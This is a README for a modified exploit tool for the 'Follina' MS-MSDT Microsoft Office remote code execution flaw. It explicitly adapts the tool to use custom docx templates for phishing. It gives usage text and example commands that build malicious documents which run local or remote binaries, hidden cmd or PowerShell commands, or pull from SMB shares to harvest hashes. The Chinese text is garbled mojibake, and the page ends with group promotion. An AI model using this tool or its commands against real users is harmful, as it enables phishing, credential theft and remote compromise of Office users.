# 'Follina' MS-MSDT n-day Microsoft Office RCEâ€”ä¿®æ”¹ç‰ˆ

æ ¹æ® https://github.com/chvancooten/follina.py çš„é¡¹ç›®è¿›è¡Œä¿®æ”¹ï¼Œå¯ä»¥è‡ªå®šä¹‰æŒ‡å®šdocxæ¨¡æ¿æ–‡ä»¶ï¼Œä¾¿äºå®æˆ˜ä¸­é’“é±¼ä½¿ç”¨ï¼Œè‡ªå·±ç¼–è¾‘å¥½é’“é±¼wordæ–‡æ¡£å-få‚æ•°æŒ‡å®šå³å¯ã€‚

## Usage:

```
usage: follina.py [-h] -m {binary,command} [-b BINARY] [-f FILE] [-c COMMAND] [-u URL] [-H HOST] [-P PORT]

optional arguments:
  -h, --help            show this help message and exit

Required Arguments:
  -m {binary,command}, --mode {binary,command}
                        Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command

Binary Execution Arguments:
  -b BINARY, --binary BINARY
                        The full path of the binary to run. Can be local or remote from an SMB share

Docx file Arguments:
  -f FILE, --file FILE  The docx file

Command Execution Arguments:
  -c COMMAND, --command COMMAND
                        The encoded command to execute in "command" mode

Optional Arguments:
  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"
  -H HOST, --host HOST  The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)
  -P PORT, --port PORT  The port to run the HTTP server on, defaults to 80
```

## Examples:

```
é»˜è®¤docx muban.docx
# Execute a local binary
python .\follina.py -m binary -b \windows\system32\calc.exe
python .\follina.py -m binary -b \windows\system32\calc.exe -f muban2.docx

# On linux you may have to escape backslashes
python .\follina.py -m binary -b \\windows\\system32\\calc.exe

# Execute a binary from a file share (can be used to farm hashes ğŸ‘€)
python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe

# Execute an arbitrary powershell command
python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"

# Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
python .\follina.py -m binary -b \windows\system32\calc.exe -u 1.2.3.4

# Only run the webserver on localhost, on port 8080 instead of 80
python .\follina.py -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
```

![image-20220602201236509](images/image-20220602201236509.png)

![image-20220602201350939](images/image-20220602201350939.png)



## ä¸€èµ·äº¤æµ

æ„Ÿå…´è¶£çš„å¯ä»¥å…³æ³¨ **Z2Oå®‰å…¨æ”»é˜²** å…¬ä¼—å·å›å¤â€œ**åŠ ç¾¤**â€ï¼Œæ·»åŠ Z2OBot å°Kè‡ªåŠ¨æ‹‰ä½ åŠ å…¥**Z2Oå®‰å…¨æ”»é˜²äº¤æµç¾¤**åˆ†äº«æ›´å¤šå¥½ä¸œè¥¿ã€‚

![image-20220427110933992](images/image-20220427110933992.png)

![å…¬ä¼—å·](images/å…¬ä¼—å·.jpg)

![Z2Oå®‰å…¨æ”»é˜²äº¤æµç¾¤ç¾¤èŠqqäºŒç»´ç ](images/Z2Oå®‰å…¨æ”»é˜²äº¤æµç¾¤ç¾¤èŠqqäºŒç»´ç .png)



å›¢é˜Ÿå»ºç«‹äº†çŸ¥è¯†æ˜Ÿçƒï¼Œä¸å®šæ—¶æ›´æ–°æœ€æ–°æ¼æ´å¤ç°ï¼Œæ‰‹æŠŠæ‰‹æ•™ä½ ï¼ŒåŒæ—¶ä¸å®šæ—¶æ›´æ–°POCã€å†…å¤–ç½‘æ¸—é€æµ‹è¯•éªšæ“ä½œã€‚æ„Ÿå…´è¶£çš„å¯ä»¥åŠ ä¸€ä¸‹ã€‚

![image-20220427111016139](images/image-20220427111016139.png)

![å›¾ç‰‡](images/640-16432009920046-16444876053855.webp)

![å›¾ç‰‡](images/640-16432009920047-16444876053866.webp)

![å¾®ä¿¡å›¾ç‰‡_20220427110850](images/å¾®ä¿¡å›¾ç‰‡_20220427110850.jpg)



**æ¬¢è¿star:star: O(âˆ©_âˆ©)O**



